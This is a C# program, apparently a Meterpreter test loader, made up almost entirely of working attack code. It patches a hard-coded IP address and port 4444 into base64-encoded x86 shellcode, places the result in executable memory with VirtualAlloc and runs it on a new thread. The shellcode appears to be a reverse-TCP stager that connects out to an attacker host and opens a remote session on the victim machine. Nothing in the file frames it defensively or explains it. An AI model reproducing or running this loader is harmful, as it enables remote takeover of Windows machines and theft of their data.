using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Meterpreter_Test3
{
    class Program
    {
        static void Main(string[] args)
        {
            Task.Factory.StartNew(() => RunMeterpreter("192.168.139.129", "4444"));
            var str = Convert.ToString(Console.ReadLine());
        }

        public static void RunMeterpreter(string ip, string port)
        {
            try
            {
                var ipOctetSplit = ip.Split('.');
                byte octByte1 = Convert.ToByte(ipOctetSplit[0]);
                byte octByte2 = Convert.ToByte(ipOctetSplit[1]);
                byte octByte3 = Convert.ToByte(ipOctetSplit[2]);
                byte octByte4 = Convert.ToByte(ipOctetSplit[3]);
                int inputPort = Int32.Parse(port);
                byte port1Byte = 0x00;
                byte port2Byte = 0x00;
                if (inputPort > 256)
                {
                    int portOct1 = inputPort / 256;
                    int portOct2 = portOct1 * 256;
                    int portOct3 = inputPort - portOct2;
                    int portoct1Calc = portOct1 * 256 + portOct3;
                    if (inputPort == portoct1Calc)
                    {
                        port1Byte = Convert.ToByte(portOct1);
                        port2Byte = Convert.ToByte(portOct3);
                    }
                }
                else
                {
                    port1Byte = 0x00;
                    port2Byte = Convert.ToByte(inputPort);
                }
                byte[] shellCodePacket = new byte[9];
                shellCodePacket[0] = octByte1;
                shellCodePacket[1] = octByte2;
                shellCodePacket[2] = octByte3;
                shellCodePacket[3] = octByte4;
                shellCodePacket[4] = 0x68;
                shellCodePacket[5] = 0x02;
                shellCodePacket[6] = 0x00;
                shellCodePacket[7] = port1Byte;
                shellCodePacket[8] = port2Byte;
                string shellCodeRaw = 
                "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKiLhmgCANkDieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8M=";
                string s3 = Convert.ToBase64String(shellCodePacket);
                string newShellCode = shellCodeRaw.Replace("wKiLhmgCANkD", s3);
                byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode);
                UInt32 funcAddr = VirtualAlloc(0, (UInt32) shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(shellCodeBase64, 0, (IntPtr) (funcAddr), shellCodeBase64.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
                return;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
